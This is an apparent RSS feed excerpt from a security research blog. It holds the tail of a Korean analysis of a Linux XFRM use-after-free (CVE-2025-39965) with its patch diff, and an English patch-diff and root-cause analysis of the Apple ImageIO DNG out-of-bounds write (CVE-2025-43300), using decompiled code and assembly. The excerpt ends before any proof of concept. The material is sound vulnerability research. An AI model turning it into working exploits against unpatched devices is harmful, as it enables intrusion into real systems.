&amp;x-&gt;id.daddr, newspi,                    x-&gt;id.proto, x-&gt;props.family);                 <span class="hljs-comment">// New xfrm_state obj with spi=0</span>        hlist_add_head_rcu(&amp;x-&gt;byspi, net-&gt;xfrm.state_byspi + h);         err = <span class="hljs-number">0</span>;        spin_unlock_bh(&amp;net-&gt;xfrm.xfrm_state_lock);        <span class="hljs-keyword">goto</span> unlock;    }<span class="hljs-comment">//...</span>}</code></pre><p>&#xD574;&#xB2F9; &#xCEE4;&#xBC0B;&#xC740; SPI &#xC911;&#xBCF5; &#xBC29;&#xC9C0;&#xB97C; &#xC704;&#xD574; &#xD560;&#xB2F9; &#xB85C;&#xC9C1;&#xC744; &#xBCC0;&#xACBD;&#xD558;&#xC600;&#xB294;&#xB370;, &#xADF8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>get_random_u32_inclusive</code> &#xD568;&#xC218;&#xAC00; 0&#xC744; &#xBC18;&#xD658;&#xD560; &#xC218; &#xC788;&#xC9C0;&#xB9CC; &#xC774;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; <code>xfrm_state</code> &#xAC1D;&#xCCB4;&#xAC00; <code>spi</code> &#xAC12;&#xC774; 0&#xC778; &#xACBD;&#xC6B0;&#xC5D0;&#xB3C4; &#xACBD;&#xC6B0; &#xC720;&#xD6A8;&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB418;&#xC5B4; <code>byspi</code> &#xC804;&#xC5ED; &#xBAA9;&#xB85D;&#xC5D0; &#xCD94;&#xAC00;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">int</span> __xfrm_state_delete(struct xfrm_state *x){    <span class="hljs-comment">//...</span>    <span class="hljs-comment">//If spi is 0, it&apos;s not removed from byspi list.</span>    <span class="hljs-keyword">if</span> (x-&gt;id.spi) {         hlist_del_rcu(&amp;x-&gt;byspi);    }    xfrm_state_free(x);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>&#xADF8;&#xB7EC;&#xB098; XFRM &#xD558;&#xC704; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; <code>SPI=0</code>&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xB41C; SPI &#xC5C6;&#xC74C;&#xC744; &#xC758;&#xBBF8;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD574;&#xB2F9; &#xAC1D;&#xCCB4;&#xB97C; &#xC815;&#xB9AC;&#xD558;&#xB294; <code>__xfrm_state_delete</code> &#xD568;&#xC218;&#xB294; <code>spi</code> &#xAC12;&#xC774; 0&#xC774;&#xBA74; <code>byspi</code> &#xBAA9;&#xB85D;&#xC5D0;&#xC11C; &#xC81C;&#xAC70;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB530;&#xB77C;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC;&#xB294; &#xD574;&#xC81C;&#xB418;&#xC9C0;&#xB9CC;, <code>byspi</code> &#xBAA9;&#xB85D;&#xC5D0;&#xB294; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; dangling pointer&#xAC00; &#xB0A8;&#xC544; UAF&#xAC00; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">--- a/net/xfrm/xfrm_state.c+++ b/net/xfrm/xfrm_state.c<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">xfrm_alloc_spi</span><span class="hljs-params">(struct xfrm_state *x, u32 low, u32 high,</span></span><span class="hljs-function"><span class="hljs-params">   struct netlink_ext_ack *extack)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">//... </span> <span class="hljs-keyword">for</span> (h = <span class="hljs-number">0</span>; h &lt; range; h++) { u32 spi = (low == high)? low : get_random_u32_inclusive(low, high);+<span class="hljs-keyword">if</span> (spi == <span class="hljs-number">0</span>)+<span class="hljs-keyword">goto</span> next; newspi = htonl(spi);<span class="hljs-comment">//...</span> xfrm_state_put(x0); spin_unlock_bh(&amp;net-&gt;xfrm.xfrm_state_lock);+next: <span class="hljs-keyword">if</span> (signal_pending(current)) { err = -ERESTARTSYS; <span class="hljs-keyword">goto</span> unlock;</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58; &#xCEE4;&#xBC0B;(<a href="https://github.com/torvalds/linux/commit/cd8ae32e4e4652db55bce6b9c79267d8946765a9">cd8ae32e4e4652db55bce6b9c79267d8946765a9</a>)&#xC740; <code>xfrm_alloc_spi</code> &#xD568;&#xC218;&#xAC00; spi &#xAC1D;&#xCCB4;&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xAE30; &#xC804;, spi&#xAC12;&#xC774; 0&#xC774;&#xBA74; &#xD560;&#xB2F9;&#xC744; &#xD558;&#xC9C0; &#xC54A;&#xB3C4;&#xB85D; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/linux/">linux</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/xfrm/">xfrm</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2025-39965/">cve-2025-39965</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/26/l0ch/2025-10-26/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] ImageIO: iOS/macOS DNG Image Processing Memory Corruption (En)</title>
      <link>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_en/</link>
      <guid>https://hackyboiz.github.io/2025/10/23/clalxk/imageIO_en/</guid>
      <pubDate>Thu, 23 Oct 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/10/23/clalxk/imageIO_en/image.png&quot; alt=&quot;image.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;Hello~ After finishing the macOS series, we&amp;#x2019;re back thi</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/10/23/clalxk/imageIO_en/image.png" alt="image.png"></p><p>Hello~ After finishing the macOS series, we&#x2019;re back this time with <strong>ImageIO</strong>.</p><p>On <strong>August 20th</strong>, a vulnerability was discovered in the ImageIO framework used by iOS, macOS, and iPadOS.</p><p>It was reportedly exploited in the wild to target specific individuals &#x2014; let&#x2019;s analyze what kind of vulnerability it was!</p><p>Shall we begin? &#x1F60E;</p><hr><h1 id="0-ImageIO"><a href="#0-ImageIO" class="headerlink" title="0. ImageIO"></a>0. <a href="https://developer.apple.com/documentation/imageio">ImageIO</a></h1><p><strong>ImageIO</strong> is Apple&#x2019;s <strong>image processing framework</strong> used across macOS, iOS, and iPadOS.</p><p>It provides APIs for <strong>reading, writing, accessing metadata, compression, and decoding</strong></p><p>for a wide range of image formats. It serves as the image processing backend for many system apps and features &#x2014; including <strong>Core Graphics</strong>, <strong>Photos</strong>, <strong>Preview</strong>, <strong>Safari</strong>, <strong>Messages</strong>, <strong>AirDrop</strong>, <strong>Mail</strong>, and <strong>iCloud.</strong></p><h1 id="1-CVE-2025-43300"><a href="#1-CVE-2025-43300" class="headerlink" title="1. CVE-2025-43300"></a>1. CVE-2025-43300</h1><p><img src="/2025/10/23/clalxk/imageIO_en/image1.png" alt="image.png"></p><p>This vulnerability is an <strong>Out-of-Bounds Write</strong> in the JPEG Lossless (<code>SOF3</code>) decoder</p><p>(<code>CDNGLosslessJpegUnpacker</code>) of Apple&#x2019;s ImageIO framework, specifically within <strong>RawCamera</strong>.</p><p>It occurs when the DNG file&#x2019;s TIFF tag (<code>SamplesPerPixel</code>) does <strong>not match</strong> the number of components declared in the internal JPEG stream &#x2014; leading to incorrect loop boundaries and thus a buffer overwrite.</p><p>It was patched in <strong>iOS 18.6.2</strong>, released on <strong>August 20, 2025</strong>.</p><ul><li>Vulnerable version: <strong>iOS 18.6.1</strong></li><li>Patched version: <strong>iOS 18.6.2</strong></li></ul><p>We first wanted to identify <strong>where the patch was applied</strong>.</p><p>Using the public project <a href="https://github.com/blacktop/ipsw-diffs/tree/main"><strong>ipsw-diffs</strong></a>,</p><p>we compared the binaries between <strong>18.6.1</strong> and <strong>18.6.2</strong>.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image2.png" alt="image.png"></p><p>Everything else remained unchanged &#x2014; only <strong>RawCamera</strong> was modified.</p><p><strong>RawCamera</strong></p><blockquote><p>/System/Library/CoreServices/RawCamera.bundle/RawCamera</p></blockquote><pre><code class="hljs bash">-1738.140.3.0.0-  __TEXT.__text: 0x1e2d70-  __TEXT.__auth_stubs: 0x1850+1738.140.3.0.11+  __TEXT.__text: 0x1e3470+  __TEXT.__auth_stubs: 0x1870   __TEXT.__objc_methlist: 0x16e4   __TEXT.__const: 0x15326-  __TEXT.__gcc_except_tab: 0x2d440+  __TEXT.__gcc_except_tab: 0x2d588   __TEXT.__oslogstring: 0xec0   __TEXT.__cstring: 0xee23   __TEXT.__dof_RawCamera: 0x8f7-  __TEXT.__unwind_info: 0xb1d0+  __TEXT.__unwind_info: 0xb1e8   __TEXT.__eh_frame: 0x278   __TEXT.__objc_classname: 0x4b9   __TEXT.__objc_methname: 0x3918   __TEXT.__objc_methtype: 0xdd3   __TEXT.__objc_stubs: 0x2da0-  __DATA_CONST.__got: 0x9b0+  __DATA_CONST.__got: 0x9c8   __DATA_CONST.__const: 0x2a18   __DATA_CONST.__objc_classlist: 0x1e0   __DATA_CONST.__objc_catlist: 0x20   __DATA_CONST.__objc_imageinfo: 0x8   __DATA_CONST.__objc_selrefs: 0xcf8   __DATA_CONST.__objc_superrefs: 0xf0-  __DATA_CONST.__objc_arraydata: 0x3948-  __AUTH_CONST.__auth_got: 0xc40+  __DATA_CONST.__objc_arraydata: 0x3950+  __AUTH_CONST.__auth_got: 0xc50   __AUTH_CONST.__const: 0x35978   __AUTH_CONST.__cfstring: 0x18080   __AUTH_CONST.__objc_const: 0x48b0-  __AUTH_CONST.__objc_arrayobj: 0x570-  __AUTH_CONST.__objc_intobj: 0x39f0+  __AUTH_CONST.__objc_arrayobj: 0x588+  __AUTH_CONST.__objc_intobj: 0x3a20   __AUTH_CONST.__objc_doubleobj: 0x480   __AUTH_CONST.__objc_dictobj: 0x4d58   __AUTH_CONST.__objc_floatobj: 0xc0   - /System/Library/Frameworks/UniformTypeIdentifiers.framework/UniformTypeIdentifiers   - /System/Library/PrivateFrameworks/AppleJPEG.framework/AppleJPEG   - /System/Library/PrivateFrameworks/AppleJPEGXL.framework/AppleJPEGXL+  - /System/Library/PrivateFrameworks/CMPhoto.framework/CMPhoto   - /System/Library/PrivateFrameworks/CoreAnalytics.framework/CoreAnalytics   - /System/Library/PrivateFrameworks/MobileAsset.framework/MobileAsset   - /usr/lib/libSystem.B.dylib   - /usr/lib/libobjc.A.dylib   - /usr/lib/libxml2.2.dylib   - /usr/lib/libz.1.dylib-  UUID: 1BE38EB6-51C0-3069-A50F-CA3B000E0847-  Functions: 6433-  Symbols:   781+  UUID: AF5B7B35-3549-329B-B706-F877FA8DF849+  Functions: 6435+  Symbols:   786   CStrings:  7487 Symbols:+ _CMPhotoDecompressionContainerCreateImageForIndex+ _CMPhotoDecompressionContainerGetImageCount+ _CMPhotoDecompressionSessionCreate+ _CMPhotoDecompressionSessionCreateContainer+ _CVPixelBufferGetDataSize+ _kCMPhotoContainerFormatString_JFIF+ _kCMPhotoDecompressionContainerOption_AllowedFormatsAndCodecs+ _kCMPhotoDecompressionOption_OutputPixelFormat- _CGImageGetBytesPerRow- _CGImageGetHeight- _CGImageGetWidth</code></pre><p>Since the diff does not show code-level changes, we moved to <strong>IDA Pro</strong> for deeper inspection.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image3.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image4.png" alt="image.png"></p><p>We used <strong>ipsw</strong> to download both 18.6.1 and 18.6.2 firmwares.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image5.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image6.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image7.png" alt="image.png"></p><p>The <code>dyld_shared_cache</code> is a cache file that bundles frequently used system libraries and frameworks together for faster loading during iOS/macOS boot. It contains optimized versions of <code>.dylibs</code> and frameworks, allowing faster app startup and reduced memory usage.<br>Since the actual system loads these cached binaries, we can extract RawCamera directly from the cache for comparison and analysis.</p><p>Although it can also be extracted using <code>ipsw dyld extract</code>, in this research, we analyzed it</p><p>directly by loading <code>dyld_shared_cache</code> in IDA.</p><h2 id="1-1-bindiff"><a href="#1-1-bindiff" class="headerlink" title="1.1 bindiff"></a>1.1 bindiff</h2><p><img src="/2025/10/23/clalxk/imageIO_en/image8.png" alt="image.png"></p><p>The binary was exported in <strong>BinExport</strong> format for diffing.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image9.png" alt="image.png"></p><p>Due to limited space, we referred to public analysis from Quarkslab<br>: <a href="https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html">https://blog.quarkslab.com/patch-analysis-of-Apple-iOS-CVE-2025-43300.html</a></p><p>Out of six modified functions, two &#x2014; <code>sub_1DD8A7684</code> and <code>sub_1DD95DC1C</code> &#x2014; were significantly changed. We focused our analysis on these two.</p><h2 id="1-2-Analysis"><a href="#1-2-Analysis" class="headerlink" title="1.2 Analysis"></a>1.2 Analysis</h2><p><img src="/2025/10/23/clalxk/imageIO_en/image10.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image11.png" alt="image.png"></p><p>We loaded <code>dyld_shared_cache</code> extracted from ipsw for analysis:<br><em>&#x2192; Apple DYLD Cache for arm64e (select module(s)) &#x2192; RawCamera</em></p><p><img src="/2025/10/23/clalxk/imageIO_en/image12.png" alt="image.png"></p><p><img src="/2025/10/23/clalxk/imageIO_en/image13.png" alt="image.png"></p><p>A new <strong>pixel buffer size verification step</strong> was added.</p><p>See the following section for detailed code comparison.</p><h3 id="Code-Analysis"><a href="#Code-Analysis" class="headerlink" title="Code Analysis"></a><strong>Code Analysis</strong></h3><p><code>sub_1DD8A7684</code> &#x2192; <code>sub_1DD8A76DC</code> </p><pre><code class="hljs cpp"># iOS <span class="hljs-number">18.6</span><span class="hljs-number">.1</span> G90<span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD8A7684</span><span class="hljs-params">(...)</span></span><span class="hljs-function"><span class="hljs-comment">// shortened: legacy CGImage path</span></span><span class="hljs-function"></span>{    v13 = CGImageSourceCreateWithData(...);    ImageAtIndex = CGImageSourceCreateImageAtIndex(v13, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);    BytesPerRow = CGImageGetBytesPerRow(ImageAtIndex);    <span class="hljs-keyword">if</span> (CFDataGetLength(data) != <span class="hljs-number">4</span> * width * height)        <span class="hljs-keyword">throw</span> RawCameraException;    ...}</code></pre><pre><code class="hljs c"># iOS <span class="hljs-number">18.6</span><span class="hljs-number">.2</span> G100<span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD8A76DC</span><span class="hljs-params">(...)</span></span><span class="hljs-function"><span class="hljs-comment">// shortened: new CMPhoto + CVPixelBuffer path</span></span><span class="hljs-function"></span>{    CMPhotoDecompressionSessionCreate(...);    CMPhotoDecompressionContainerCreateImageForIndex(...);    BytesPerRow = CVPixelBufferGetBytesPerRow(buf);    DataSize = CVPixelBufferGetDataSize(buf);    <span class="hljs-keyword">if</span> (DataSize != expected)        <span class="hljs-keyword">throw</span> RawCameraException;    ...}</code></pre><h3 id="Key-Differences"><a href="#Key-Differences" class="headerlink" title="Key Differences"></a>Key Differences</h3><ol><li><p><strong>CGImage &#x2192; CMPhoto + CVPixelBuffer</strong></p><ul><li><p><strong>G90 (18.6.1):</strong></p><p>  Uses CoreGraphics pipeline (<code>CGImageSourceCreateImageAtIndex</code> + <code>CGDataProviderCopyData</code>)</p><p>  and directly iterates raw <code>CFData</code> bytes.</p></li><li><p><strong>G100 (18.6.2):</strong></p><p>  Introduces <strong>CMPhoto</strong> decompression pipeline:</p><p>  <code>CMPhotoDecompressionSessionCreate &#x2192; CMPhotoDecompressionContainerCreateImageForIndex</code> &#x2192; <code>CVPixelBuffer</code>.</p><p>  Accesses pixels through <strong>CVPixelBufferLockBaseAddress()</strong>, ensuring safer memory handling.</p></li></ul></li><li><p><strong>Buffer Size Validation Added</strong></p> <pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (CFDataGetLength(data) != <span class="hljs-number">4</span> * width * height) <span class="hljs-keyword">throw</span> RawCameraException;</code></pre><ul><li><p><strong>Before:</strong> Only checked <code>CFDataGetLength() == 4 * width * height</code>.</p><p>  This ignored row padding (<code>bytesPerRow</code>) and format variations.</p></li></ul></li></ol><pre><code><pre><code class="hljs cpp">BytesPerRow = CVPixelBufferGetBytesPerRow(buf);DataSize    = CVPixelBufferGetDataSize(buf);<span class="hljs-comment">// expected = f(width, height)  // sub_1DD8A8C14</span><span class="hljs-comment">// bpp = 4                       // v68=4 &#x2192; sub_1DD8A8C7C</span><span class="hljs-keyword">if</span> (DataSize != expected) <span class="hljs-keyword">throw</span> RawCameraException;</code></pre>- **After:** Validates using `CVPixelBufferGetDataSize()` against an internally computed expected value (considering stride).    &#x2192; Prevents overrun caused by underestimated buffer size.</code></pre><ol><li><strong>Pixel Channel Order</strong><ul><li><strong>Old:</strong> Assumed RGB order, manual pointer increments.</li><li><strong>New:</strong> Explicitly treats buffer as BGRA, reading channels in fixed offsets (B&#x2192;G&#x2192;R).</li></ul></li></ol><hr><p><strong>Summary:</strong></p><p>The patch migrated from <strong>CoreGraphics raw byte decoding</strong> to a <strong>CoreMedia Photo pipeline</strong></p><p>and added <strong>explicit data size/stride checks</strong>, eliminating unbounded writes from mismatched DNG metadata.</p><p>Through the analysis of the modified code, we were able to understand the general behavior of the function.</p><p>In summary, <strong>G90 (iOS 18.6.1)</strong> decodes the image through the <strong>CGImage</strong> path and directly iterates over the <strong>CFData</strong> buffer. The verification process only checks two things &#x2014; the <strong>match of width and height</strong>, and whether <strong>CFDataGetLength() == 4 &#xD7; W &#xD7; H</strong> &#x2014; while actual memory access is performed using a <strong>row-based offset (</strong><code>BytesPerRow</code><strong>)</strong>. Because of this, for certain images (depending on color space, subsampling, or row padding), the validation may <strong>pass successfully, but the actual access can exceed the bounds of CFData</strong>.</p><p>In contrast, <strong>G100 (iOS 18.6.2)</strong> fixes this issue by switching the decoding pipeline from <strong>CGImage &#x2192; CMPhoto (JFIF only) &#x2192; CVPixelBuffer</strong>, and comparing the <strong>actual total buffer size (</strong><code>CVPixelBufferGetDataSize</code><strong>)</strong> against an <strong>expected value</strong> computed internally based on width, height, and other parameters.</p><hr><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>(Analyzed based on the G90 version)</p><p>During analysis, we observed that <code>sub_1DD8A7684</code> makes a function call through a <strong>vtable</strong>.</p><p>In C++, every object typically begins with a <strong>vptr (virtual table pointer)</strong>.</p><p>Virtual function calls are made at runtime through that pointer &#x2014; something like <code>this-&gt;vptr[slot]</code>.</p><p>However, since the RawCamera binary is <strong>fully stripped</strong>, only addresses are visible,</p><p>making direct analysis difficult.</p><pre><code class="hljs cpp">[ex](*(*<span class="hljs-keyword">this</span>)+<span class="hljs-number">0xE0</span>)(<span class="hljs-keyword">this</span>, buf, w, h)</code></pre><p>which conceptually means:</p><pre><code class="hljs cpp">[ex]<span class="hljs-keyword">this</span>-&gt;vptr-&gt;unpack_lossless(<span class="hljs-keyword">this</span>, buf, w, h)</code></pre><p>To make it more readable and traceable, I defined the vtable as a structure (class) in IDA using an IDAPython script.</p><p>The script did the following:</p><ol><li>Parse the vtable and create a corresponding struct.</li><li>Apply <code>struct CDNGLosslessJpegUnpacker *this</code> as the first parameter for all virtual functions.</li></ol><p>Once this is done, the call expression <code>(*(*this)+0xE0)(this)</code> appears as <code>this-&gt;vptr-&gt;fn_028(this, &#x2026;)</code>, and fields like <code>this-&gt;field_d8</code> become explicit &#x2014; making slot mapping and call tracing much easier.</p><p>Now, let&#x2019;s identify where the vulnerable function is actually invoked in the call tree.</p><p><img src="/2025/10/23/clalxk/imageIO_en/image14.png" alt="image.png"></p><p>Filtering for &#x201C;Lossless&#x201D; quickly reveals the target class</p><p><code>CDNGLosslessJpegUnpacker</code>.</p><p>Following the references leads to the function <code>sub_1DD95DE88</code>.</p><p><strong>Detailed Code (sub_1DD95DE88)</strong></p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> __fastcall <span class="hljs-title">sub_1DD95DE88</span><span class="hljs-params">(<span class="hljs-keyword">os_signpost_id_t</span> a1, __int64 a2, __int64 a3, __int64 a4)</span></span><span class="hljs-function"></span>{  .  .  .    <span class="hljs-keyword">if</span> ( *(_DWORD *)(a1 + <span class="hljs-number">216</span>)    || (*(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> (__fastcall **)(<span class="hljs-keyword">os_signpost_id_t</span>))(*(_QWORD *)a1 + <span class="hljs-number">224L</span>L))(a1) == <span class="hljs-number">2</span>    || (v12 = *(_QWORD *)(a1 + <span class="hljs-number">240</span>) - *(_QWORD *)(a1 + <span class="hljs-number">232</span>), v12 == <span class="hljs-number">4</span>) )  {    sub_1DD9009D4(a1, a2, a3, a4);  }  <span class="hljs-keyword">else</span>  {    v14 = *(_DWORD *)(a1 + <span class="hljs-number">44</span>);    v13 = *(_DWORD *)(a1 + <span class="hljs-number">48</span>);    v15 = *(_DWORD *)(a1 + <span class="hljs-number">224</span>);    v16 = *(_DWORD *)(a1 + <span class="hljs-number">228</span>);    *(_QWORD *)&amp;v35 = v12 &gt;&gt; <span class="hljs-number">2</span>;    sub_1DD8731E0(&amp;v36, &amp;v35);    <span class="hljs-keyword">if</span> ( *(_QWORD *)(a1 + <span class="hljs-number">240</span>) - *(_QWORD *)(a1 + <span class="hljs-number">232</span>) != *(_QWORD *)(a1 + <span class="hljs-number">264</span>) - *(_QWORD *)(a1 + <span class="hljs-number">256</span>)      || (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v14 - <span class="hljs-number">100000</span>) &lt; <span class="hljs-number">0xFFFE7961</span>      || (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v13 - <span class="hljs-number">100000</span>) &lt; <span class="hljs-number">0xFFFE7961</span>      || v15 - <span class="hljs-number">100000</span> &lt; <span class="hljs-number">0xFFFE7961</span>      || v16 - <span class="hljs-number">100000</span> &lt; <span class="hljs-number">0xFFFE7961</span>      || (v28 = v11, v17 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v36, v36 &gt;= <span class="hljs-number">20000</span>) )    {      exception_15 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-built_in">std</span>::runtime_error::runtime_error(exception_15, <span class="hljs-string">&quot;RawCameraException&quot;</span>);      __cxa_throw(exception_15, MEMORY[<span class="hljs-number">0x1E6FA15F0</span>], MEMORY[<span class="hljs-number">0x1E6FA1480</span>]);    }    v29 = a4;    <span class="hljs-keyword">if</span> ( (((v13 + v16 - <span class="hljs-number">1</span>) / v16) &gt;&gt; (*(_DWORD *)(a1 + <span class="hljs-number">216</span>) != <span class="hljs-number">0</span>)) * ((v14 + v15 - <span class="hljs-number">1</span>) / v15) != v36 )    {      v27 = (<span class="hljs-built_in">std</span>::runtime_error *)__cxa_allocate_exception_15(<span class="hljs-number">0x10</span>uLL);      <span class="hljs-built_in">std</span>::runtime_error::runtime_error(v27, <span class="hljs-string">&quot;RawCameraException&quot;</span>);      __cxa_throw(v27, MEMORY[<span class="hljs-number">0x1E6FA15F0</span>], MEMORY[<span class="hljs-number">0x1E6FA1480</span>]);    }    group = dispatch_group_create();    v30 = dispatch_queue_create(<span class="hljs-string">&quot;Lossless DNG Tile Unpacker Queue&quot;</span>, MEMORY[<span class="hljs-number">0x1E6FA52F0</span>]);</code></pre><p>The function performs <strong>three checks</strong>:</p><ol><li><code>[this+0xD8] != 0</code></li><li><code>vtable[28](this) == 2</code></li><li><code>[this+0xF0] - [this+0xE8] == 4</code></li></ol><p>If <strong>any</strong> of these conditions is true, it calls <code>sub_1DD9009D4()</code> and <strong>exits safely</strong>.</p><p>Otherwise, it proceeds to the <strong>&#x201C;Tile Queue&#x201D;</strong> path &#x2014; which includes the vulnerable function chain.</p><pre><code class="hljs c">; Check <span class="hljs-number">1</span>LDR   W8, [X23,#<span class="hljs-number">0xD8</span>]CBNZ  W8, loc_1DD95DF78; Check <span class="hljs-number">2</span>LDR   X16, [X23]AUTDA X16, X17LDR   X8, [X16,#<span class="hljs-number">0xE0</span>]!  ; vtable[<span class="hljs-number">0xE0</span>/<span class="hljs-number">8</span>] -&gt; slot <span class="hljs-number">28</span>MOV   X0, X23BLRAA X8, X17CMP   W0, #<span class="hljs-number">2</span>BEQ   loc_1DD95DF78; Check <span class="hljs-number">3</span>LDP   X9, X8, [X23,#<span class="hljs-number">0xE8</span>]SUB   X8, X8, X9CMP   X8, #<span class="hljs-number">4</span>B.NE  loc_1DD95E008</code></pre><p>If none of the above branches are taken, the function reaches a section where a dispatch queue named <code>&quot;Lossless DNG Tile Unpacker Queue&quot;</code> is created &#x2014; this is the path that eventually leads to the vulnerable unpacking logic.</p><pre><code class="hljs angelscript"><span class="hljs-comment">// sub_1DD95DE88 simplified</span><span class="hljs-keyword">if</span> ([<span class="hljs-keyword">this</span>+<span class="hljs-number">0xD8</span>] != <span class="hljs-number">0</span> || vtable[<span class="hljs-number">28</span>](<span class="hljs-keyword">this</span>) == <span class="hljs-number">2</span> || ([<span class="hljs-keyword">this</span>+<span class="hljs-number">0xF0</span>]-[<span class="hljs-keyword">this</span>+<span class="hljs-number">0xE8</span>]) == <span class="hljs-number">4</span>){    sub_1DD9009D4(...); <span class="hljs-comment">// safe path</span>} <span class="hljs-keyword">else</span> {    <span class="hljs-comment">// Vulnerable path</span>    dispatch_group_create();    dispatch_queue_create(<span class="hljs-string">&quot;Lossless DNG Tile Unpacker Queue&quot;</span>, ...);    sub_1DD95E410 &#x2192; sub_1DD95DCD8 &#x2192; sub_1DD95E4A4 <span class="hljs-keyword">or</span> sub_1DD95B198    &#x2192; sub_1DD95EA64 &#x2192; sub_1DDA4EF58}</code></pre><p>Thus, when all three conditions fail,<br>the code spawns a tile-based decompression queue that ultimately triggers the vulnerable unpack routine.</p><h3 id="What-is-the-Tile-Queue"><a href="#What-is-the-Tile-Queue" class="headerlink" title="What is the Tile Queue?"></a>What is the Tile Queue?</h3><p>The <strong>tile queue</strong> splits a large image into small rectangular <strong>tiles</strong> (TileWidth &#xD7; TileLength).</p><p>Each tile is decoded, color-corrected, and placed in the output buffer.</p><p>The vulnerable path processes each tile independently but assumes metadata consistency between <strong>SamplesPerPixel</strong> and <strong>NumComponents</strong> &#x2014; which, when mismatched, causes a buffer overflow.</p><p><strong>Simplified Call Tree</strong></p><pre><code class="hljs c"><span class="hljs-number">0x1DD95DE88</span>    <span class="hljs-number">0x1DD95E410</span>        <span class="hljs-number">0x1DD95DCD8</span>            <span class="hljs-number">0x1DD95E4A4</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x1DD95B198</span>                <span class="hljs-number">0x1DD95EF54</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0x1DD95EA64</span>                    <span class="hljs-number">0x1DDA4EF58</span></code></pre><hr><p><img src="/2025/10/23/clalxk/imageIO_en/image15.png" alt="image.png"></p><p>Boom &#x1F4A5; &#x2014; and with a clearer head, let&#x2019;s continue &gt;&lt;</p><hr><p>Before diving into the PoC,</p><p>let&#x2019;s briefly recap the <strong>background concepts</strong> necessary to understand this behavior.</p><hr><h2 id="Background-Concepts"><a href="#Background-Concepts" class="headerlink" title="Background Concepts"></a>Background Concepts</h2><h3 id="1-Pixels-Channels-Samples-and-Bit-Depth"><a href="#1-Pixels-Channels-Samples-and-Bit-Depth" class="headerlink" title="1. Pixels, Channels (Samples), and Bit Depth"></a>1. Pixels, Channels (Samples), and Bit Depth</h3><ul><li><strong>Pixel</strong>: The smallest visual unit of an image.</li><li><p><strong>Channel (Sample)</strong>: A single numeric component representing one aspect of a pixel (R, G, B, etc.).</p><p>  &#x2192; <code>SamplesPerPixel</code> = number of channels per pixel</p><p>  &#x2192; <code>BitsPerSample</code> = number of bits used to represent each channel</p></li></ul><p>Examples:</p><div class="table-container"><table><thead><tr><th>Type</th><th>SamplesPerPixel</th><th>BitsPerSample</th><th>Bytes per Pixel</th></tr></thead><tbody><tr><td>Grayscale</td><td>1</td><td>8</td><td>1</td></tr><tr><td>RGB 8bpc</td><td>3</td><td>8</td><td>3</td></tr><tr><td>RGBA 16bpc</td><td>4</td><td>16</td><td>8</td></tr></tbody></table></div><p>These metadata values determine <strong>buffer size</strong>, <strong>stride (bytes per row)</strong>, and <strong>loop boundaries</strong> in decompression.</p><h3 